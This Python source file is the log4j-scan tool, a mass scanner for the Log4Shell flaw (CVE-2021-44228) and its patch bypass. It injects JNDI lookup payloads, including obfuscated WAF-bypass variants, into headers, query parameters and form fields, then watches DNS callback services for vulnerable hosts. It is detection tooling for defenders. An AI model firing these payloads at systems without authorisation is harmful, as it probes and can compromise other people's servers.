#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import NAMESPACE_DNS, uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
from pathlib import Path
from datetime import datetime
import httpx
import asyncio
import pprint



# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = httpx.Timeout(timeout=4, pool=None)

errors = {}
succeeded = 0

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                 ]  


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("--custom-dns-callback-domain",
                    dest="custom_dns_callback_domain",
                    help="Custom DNS Callback Domain. Defaults to value set by --custom-dns-callback-host value.",
                    action='store')
parser.add_argument("--custom-dns-callback-token",
                    dest="custom_dns_callback_token",
                    help="Custom DNS Callback Auth Token.",
                    action='store')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

def get_cve_2021_45046_payloads(callback_host, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php",
                         proxies=proxies,
                         timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php",
                         proxies=proxies,
                         timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server="", domain_postfix=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server or "interact.sh"
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain_postfix = domain_postfix or self.server
        self.domain = f'{guid}.{self.domain_postfix}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        print(f"Using server {self.server} with domain {self.domain}")
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"http://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception(f"Can not initiate interact.sh DNS callback client: {res}")

    def pull_logs(self):
        result = []
        url = f"http://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


async def scan_url(url, callback_host, client: httpx.AsyncClient):
    #cprint(f"[•] URL: {url}", "magenta")
    global succeeded
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    if args.cve_2021_45046:
        #cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))

    for payload in payloads:
        #cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                await client.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 # verify=False,
                                 timeout=timeout,
                                 follow_redirects=(not args.disable_redirects),
                                 # proxies=proxies
                                 )
                succeeded +=1
            except Exception as e:

                e_type = type(e)
                errors.setdefault(e_type, 0)
                errors[e_type] = errors[e_type] + 1
                #cprint(f"EXCEPTION: {e_type} {e}")

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                await client.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 # verify=False,
                                 timeout=timeout,
                                 follow_redirects=(not args.disable_redirects),
                                 # proxies=proxies
                                 )
                succeeded += 1
            except Exception as e:
                e_type = type(e)
                errors.setdefault(e_type, 0)
                errors[e_type] = errors[e_type] + 1
                #cprint(f"EXCEPTION: {e_type} {e}")

            try:
                # JSON body
                await client.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 # verify=False,
                                 timeout=timeout,
                                 follow_redirects=(not args.disable_redirects),
                                 # proxies=proxies
                                 )
                succeeded += 1
            except Exception as e:
                e_type = type(e)
                errors.setdefault(e_type, 0)
                errors[e_type] = errors[e_type] + 1
                #cprint(f"EXCEPTION: {e_type} {e}")


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


async def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}, custom host {args.custom_dns_callback_host}).")
        dns_callback_host =  args.custom_dns_callback_host
        dns_callback_domain = dns_callback_host
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
    token = args.custom_dns_callback_token or ""
    if args.custom_dns_callback_domain:
        dns_callback_domain = args.custom_dns_callback_domain
        print(f"Using using DNS callback domain {dns_callback_domain}")
    if args.dns_callback_provider == "interact.sh":
        dns_callback = Interactsh(token=token, server=dns_callback_host, domain_postfix=dns_callback_domain)
    elif args.dns_callback_provider == "dnslog.cn":
        # Warning: dnslog impl here does not support everything like token etc
        dns_callback = Dnslog()
    else:
        raise ValueError("Invalid DNS Callback provider")
    dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    processed = 0
    async with httpx.AsyncClient(
        verify=False, 
        limits=httpx.Limits(max_connections=100, max_keepalive_connections=80),
        timeout=timeout,
        ) as client:
        for url_chunk in chunks(urls, 1000):
            tasks = []
            for url in url_chunk:
                tasks.append(asyncio.create_task(scan_url(url, dns_callback_host, client=client)))
                processed += 1
            await asyncio.gather(*tasks)
            print(f"Scanned: {processed}/{len(urls)}")
        
    cprint(f"Succeeded connections: {succeeded}", "magenta")
    cprint(f"Failures: \n{pprint.pformat(errors, width=4, indent=3)}\n", "magenta")
    

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(int(args.wait_time))
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets does not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Target Affected", "yellow")
        for i in records:
            cprint(i, "yellow")
        file = Path(f"affected.{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}.json")
        print(f"Writing affected hosts to {file}")
        with file.open("w") as f:
            json.dump(records, f, indent=4)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
